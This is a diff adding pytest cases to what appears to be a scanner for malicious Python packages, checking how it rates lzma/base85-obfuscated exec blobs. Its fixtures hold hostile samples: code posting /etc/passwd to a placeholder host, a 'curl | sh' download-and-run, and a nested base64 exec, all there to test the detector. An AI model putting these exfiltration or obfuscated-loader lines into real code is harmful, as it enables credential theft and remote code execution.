@@ -1336,3 +1336,41 @@ def test_version_check_and_download_only_are_medium(files):
 )
 def test_download_then_run_or_beacon_stays_high(src):
     assert RULE_INSTALL_TIME in _high_rules({"p-1/setup.py": src})
+
+
+def _vendored(source: str, ns: str = ", multiCMD.__dict__") -> str:
+    import base64
+    import lzma
+
+    blob = base64.a85encode(lzma.compress(source.encode())).decode()
+    return (f"import base64, lzma, types\nmultiCMD = types.ModuleType('multiCMD')\n"
+            f"exec(lzma.decompress(base64.a85decode({blob!r})){ns})\n")
+
+
+_LIB = "import subprocess\ndef run(cmd):\n    return subprocess.run(cmd, shell=True)\n"
+
+
+def _obf(src: str):
+    return [f for f in analyze_files({"p-1/setup.py": "", "p-1/PKG-INFO": "Name: p",
+                                      "p-1/hpcp.py": src}) if f.rule == RULE_OBFUSCATED]
+
+
+def test_vendored_library_blob_into_module_namespace_is_medium():
+    """hpcp·statblk·statbtrfs — 자기 라이브러리를 다른 모듈 네임스페이스에 심는다. 해독해 보니
+    함수 정의뿐(subprocess 는 함수 안)이라 import 시점 위험 행위가 없다."""
+    assert [f.severity for f in _obf(_vendored(_LIB))] == [Severity.MEDIUM]
+
+
+@pytest.mark.parametrize(
+    ("source", "ns"),
+    [
+        (_LIB, ""),                                   # 네임스페이스 없이 exec — 그대로 HIGH
+        (_LIB, ", globals()"),
+        ("import requests\nrequests.post('http://x', data=open('/etc/passwd').read())\n",
+         ", multiCMD.__dict__"),                      # 해독된 소스가 import 시점에 유출
+        ("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n", ", multiCMD.__dict__"),
+        ("import os\nos.system('curl http://x | sh')\n", ", multiCMD.__dict__"),
+    ],
+)
+def test_blob_that_acts_at_import_or_runs_in_globals_stays_high(source, ns):
+    assert Severity.HIGH in [f.severity for f in _obf(_vendored(source, ns))]
